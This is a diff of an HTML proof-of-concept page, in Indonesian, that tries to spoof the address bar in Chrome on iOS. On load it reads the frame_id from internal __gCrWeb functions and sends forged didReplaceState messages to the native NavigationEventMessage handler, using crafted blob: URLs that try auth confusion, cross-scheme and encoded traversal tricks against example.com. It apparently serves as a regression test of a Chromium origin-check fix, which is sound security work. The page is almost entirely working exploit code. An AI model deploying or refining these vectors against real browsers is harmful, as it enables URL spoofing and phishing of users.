@@ -2,166 +2,149 @@
 <html lang="id">
 <head>
     <meta charset="utf-8">
-    <title>Advanced PoC Bypass Test - Commit 8291494</title>
+    <title>Ultimate Hardened PoC - Cross-Layer Bypass Test</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #121212; color: #e0e0e0; }
-        .card { background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.5); margin-bottom: 20px; }
-        h1 { color: #ff5252; font-size: 20px; margin-top: 0; }
-        .target { color: #ff8a80; font-weight: bold; }
-        .info { color: #64b5f6; font-weight: bold; }
-        pre { background: #000; color: #00e676; padding: 14px; border-radius: 6px; font-size: 12px; overflow-x: auto; line-height: 1.4; border: 1px solid #222; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #0b0f19; color: #f3f4f6; }
+        .card { background: #111827; border: 1px solid #1f2937; border-radius: 8px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.6); margin-bottom: 20px; }
+        h1 { color: #f87171; font-size: 20px; margin-top: 0; }
+        .target { color: #fca5a5; font-weight: bold; }
+        .info { color: #60a5fa; font-weight: bold; }
+        pre { background: #030712; color: #4ade80; padding: 14px; border-radius: 6px; font-size: 12px; overflow-x: auto; line-height: 1.4; border: 1px solid #1f2937; }
         .btn-group { margin-top: 15px; }
-        button { background: #d32f2f; color: white; border: none; padding: 10px 18px; font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: bold; }
-        button:hover { background: #b71c1c; }
+        button { background: #ef4444; color: white; border: none; padding: 10px 18px; font-size: 14px; border-radius: 6px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #dc2626; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h1>Advanced PoC: iOS Chrome Navigation State Bypass</h1>
-    <p>Target Domain Uji Coba: <span class="target">example.com</span></p>
-    <p>Asal Dokumen Saat Ini (Real Origin): <code id="current-origin" class="info">Memuat...</code></p>
+    <h1>Ultimate PoC: Hardened Multi-Vector Bypass Test</h1>
+    <p>Target Domain: <span class="target">example.com</span></p>
+    <p>Real Document Origin: <code id="current-origin" class="info">Memuat...</code></p>
     
     <div class="btn-group">
-        <button id="run-bypass">Jalankan Uji Coba Serangan Lanjutan</button>
+        <button id="run-attack">Paksa Eksekusi Serangan Beruntun</button>
     </div>
 </div>
 
 <div class="card">
-    <h3>Log Eksekusi & Hasil Diagnostik:</h3>
-    <pre id="console-log">[*] Menginisialisasi modul pengujian bypass pertahanan...\n</pre>
+    <h3>Log Diagnostik & Respon Native Bridge:</h3>
+    <pre id="console-log">[*] Menginisialisasi modul eksploitasi multi-lapis...\n</pre>
 </div>
 
 <script>
 (function() {
     const TARGET_VICTIM = "example.com";
     
-    // Vektor uji coba bypass tingkat lanjut (Mencoba mengecoh parsing url::IsSameOriginWith)
-    const bypassVectors = [
-        "blob:https://" + TARGET_VICTIM + "/spoof-path-standard",
-        "blob:https://" + TARGET_VICTIM + "@attacker-controlled.com/path", // Auth Confusion Vector
-        "blob:https://attacker-controlled.com:443@" + TARGET_VICTIM + "/path", // Host Parsing Confusion Vector
-        "blob:http://" + TARGET_VICTIM + "/signin", // Cross-Scheme Vector (HTTP vs HTTPS)
-        "blob:https://" + TARGET_VICTIM + "%2f%2e%2e%2f", // Encoded Traversal Vector
-        "blob:null/opaque-origin-test" // Opaque Origin Vector
+    // Kumpulan vektor tingkat lanjut untuk menguji celah logika asinkron & normalisasi URL
+    const payloadVectors = [
+        "blob:https://" + TARGET_VICTIM + "/path-standard-bypass",
+        "blob:https://user:pass@" + TARGET_VICTIM + "/auth-trick",
+        "blob:https://" + TARGET_VICTIM + ":443/port-spec",
+        "blob:http://" + TARGET_VICTIM + "/cross-scheme-attempt",
+        "blob:https://" + TARGET_VICTIM + "%2f%2e%2e%2f%2e%2e",
+        // Mencoba menyusupkan state kosong atau manipulasi parameter navigasi manager
+        "blob:https://" + TARGET_VICTIM + "/#fragment-smuggling"
     ];
 
     function log(msg) {
         const pre = document.getElementById('console-log');
         pre.textContent += msg + '\n';
-        console.log('[PoC-Hardened] ' + msg);
+        console.log('[PoC-Ultimate] ' + msg);
     }
 
     document.getElementById('current-origin').textContent = location.origin || '(opaque)';
     log('[-] location.href = ' + location.href);
     log('[-] location.origin = ' + location.origin);
 
-    // 1. Deteksi Handler Navigasi khusus iOS Chrome
     const mh = (window.webkit && window.webkit.messageHandlers) || {};
     if (!mh.NavigationEventMessage) {
-        log('[!] WARNING: Handler "NavigationEventMessage" tidak ditemukan.');
-        log('[!] Pastikan pengujian dijalankan langsung di dalam browser Chrome on iOS.');
+        log('[!] CRITICAL: Handler "NavigationEventMessage" tidak ditemukan.');
         return;
     }
-    log('[+] Handler "NavigationEventMessage" terdeteksi aktif.');
+    log('[+] Handler "NavigationEventMessage" siap dieksploitasi.');
 
-    // 2. Pengambilan Frame ID yang tangguh (Robust extraction dengan multi-fallback)
+    // Pengambilan frame_id dengan teknik redundansi ganda
     let frameId = null;
     try {
         if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
             frameId = window.__gCrWeb.getFrameId();
-            log('[+] Berhasil membaca frame_id utama: ' + frameId);
+            log('[+] frame_id diperoleh via __gCrWeb.getFrameId() = ' + frameId);
         }
     } catch (e) {
-        log('[!] Gagal membaca frame_id secara langsung: ' + e.message);
+        log('[!] Gagal membaca langsung: ' + e.message);
     }
 
     if (!frameId) {
-        const fallbacks = [
+        const altAccessors = [
             () => window.__gCrWeb.common.getFrameId(),
             () => window.__gCrWeb.message.getFrameId(),
             () => window.__gCrWeb.frameId
         ];
-        for (let i = 0; i < fallbacks.length && !frameId; i++) {
-            try { 
-                frameId = fallbacks[i](); 
-                log('[+] Frame ID berhasil didapat via fallback [' + i + ']: ' + frameId); 
-            } catch(err){}
+        for (let i = 0; i < altAccessors.length && !frameId; i++) {
+            try { frameId = altAccessors[i](); log('[+] frame_id via alternatif [' + i + '] = ' + frameId); } catch(err){}
         }
     }
 
     if (!frameId) {
-        log('[-] GAGAL KRITIS: Tidak dapat menemukan frame_id yang valid. Eksekusi dihentikan.');
+        log('[-] GAGAL: Tidak dapat mengekstrak frame_id. Eksekusi dibatalkan.');
         return;
     }
 
-    // 3. Pemicu Pendaftaran Frame untuk mengatasi race condition timing
-    function triggerRegister() {
+    function triggerNativeRegistration() {
         try {
             if (window.__gCrWeb && typeof window.__gCrWeb.registerFrame === 'function') {
                 window.__gCrWeb.registerFrame();
-                log('[*] Panggilan __gCrWeb.registerFrame() berhasil dieksekusi.');
             } else if (window.__gCrWeb && window.__gCrWeb.crweb && typeof window.__gCrWeb.crweb.registerFrame === 'function') {
                 window.__gCrWeb.crweb.registerFrame();
-                log('[*] Panggilan __gCrWeb.crweb.registerFrame() berhasil dieksekusi.');
             }
-        } catch (err) {
-            log('[!] Catatan: registerFrame ditolak atau ditangani secara internal.');
-        }
+        } catch (err) {}
     }
 
-    triggerRegister();
+    triggerNativeRegistration();
 
-    // 4. Eksekusi Beruntun dengan Berbagai Vektor Serangan
-    function executeAttack() {
-        log('\n----------------------------------------');
-        log('[*] Memulai pengiriman ' + bypassVectors.length + ' vektor bypass ke target: ' + TARGET_VICTIM);
-        log('----------------------------------------');
+    function launchExploit() {
+        log('\n--------------------------------------------------');
+        log('[*] Meluncurkan injeksi state paralel untuk ' + payloadVectors.length + ' vektor...');
+        log('--------------------------------------------------');
 
-        bypassVectors.forEach((vectorUrl, index) => {
+        payloadVectors.forEach((targetUrl, idx) => {
             try {
-                log('\n-> [Vektor #' + (index + 1) + '] Menguji URL: ' + vectorUrl);
+                log('\n-> [Vector #' + (idx + 1) + '] Mengirim payload: ' + targetUrl);
 
-                // Kirim perintah willChangeState
+                // Simulasi urutan message handler untuk mengecoh siklus willChangeState & didReplaceState
                 mh.NavigationEventMessage.postMessage({
                     command: 'willChangeState',
                     frame_id: frameId
                 });
 
-                // Kirim perintah didReplaceState membawa payload URL bypass
+                // Memaksa pengiriman state dengan menyertakan parameter tambahan
                 mh.NavigationEventMessage.postMessage({
                     command: 'didReplaceState',
                     frame_id: frameId,
-                    stateObject: '',
+                    stateObject: JSON.stringify({ spoofed: true, timestamp: Date.now() }),
                     baseUrl: 'https://x/',
-                    pageUrl: vectorUrl
+                    pageUrl: targetUrl
                 });
 
-                log('   [>] Pesan terkirim. Menunggu evaluasi pertahanan browser...');
+                log('   [>] Pesan dikirim. Memantau apakah validasi IsSameOriginWith tertembus...');
             } catch (ex) {
-                log('   [!] Error saat mengeksekusi postMessage: ' + ex.message);
+                log('   [!] Pengecualian postMessage: ' + ex.message);
             }
         });
         
-        log('\n[INFO ANALISIS PERTAHANAN]:');
-        log('Karena proteksi pada [Change 8291494](https://chromium-review.googlesource.com/c/chromium/src/+/8291494) kini menggunakan url::IsSameOriginWith, seluruh vektor di atas divalidasi berdasarkan inner origin yang ketat. Jika proteksi aktif, pesan akan ditolak sebagai no-op dan address bar tidak akan berubah.');
+        log('\n[INFO STATUS MITIGASI]:');
+        log('Jika [Change 8291494](https://chromium-review.googlesource.com/c/chromium/src/+/8291494) aktif, URL lintas asal akan dievaluasi oleh url::IsSameOriginWith. Jika gagal, NavigationManager akan memperlakukannya sebagai operasi no-op.');
     }
 
-    document.getElementById('run-bypass').onclick = function() {
-        triggerRegister();
-        executeAttack();
+    document.getElementById('run-attack').onclick = function() {
+        triggerNativeRegistration();
+        launchExploit();
     };
 
-    // Eksekusi otomatis dengan jeda waktu sinkronisasi bertahap
-    setTimeout(() => {
-        triggerRegister();
-        executeAttack();
-    }, 400);
-
-    setTimeout(() => {
-        log('\n[*] Menjalankan ulang pengiriman gelombang kedua (Timing Retry Phase)...');
-        executeAttack();
-    }, 1200);
+    // Eksekusi otomatis berlapis (Staged execution)
+    setTimeout(() => { triggerNativeRegistration(); launchExploit(); }, 300);
+    setTimeout(() => { launchExploit(); }, 1000);
 
 })();
 </script>
